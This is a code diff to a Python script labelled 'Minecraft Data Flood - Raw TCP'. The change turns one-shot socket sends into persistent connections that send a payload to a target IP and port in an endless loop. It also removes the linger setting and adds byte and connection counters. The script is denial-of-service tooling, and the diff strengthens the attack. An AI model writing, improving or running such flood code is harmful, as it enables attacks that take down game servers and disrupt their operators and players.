@@ -1,7 +1,7 @@
 """
 Minecraft Data Flood - Raw TCP
 """
-import socket, time, sys, asyncio, struct
+import socket, time, sys, asyncio
 from colorama import init, Fore
 init(autoreset=True)
 
@@ -22,18 +22,24 @@ async def flood_task(stop):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
-            s.settimeout(3.0)
+            s.settimeout(5.0)
             s.setblocking(False)
             await asyncio.wait_for(loop.sock_connect(s, (TARGET_IP, TARGET_PORT)), timeout=3.0)
-            await loop.sock_sendall(s, PAYLOAD)
             async with lock:
-                bytes_sent += len(PAYLOAD)
                 connections += 1
-            s.close()
+            while not stop.is_set():
+                try:
+                    await loop.sock_sendall(s, PAYLOAD)
+                    async with lock:
+                        bytes_sent += len(PAYLOAD)
+                except:
+                    break
         except:
             async with lock:
                 errors += 1
+        finally:
+            try: s.close()
+            except: pass
 
 async def monitor(stop, start, tasks):
     while not stop.is_set():
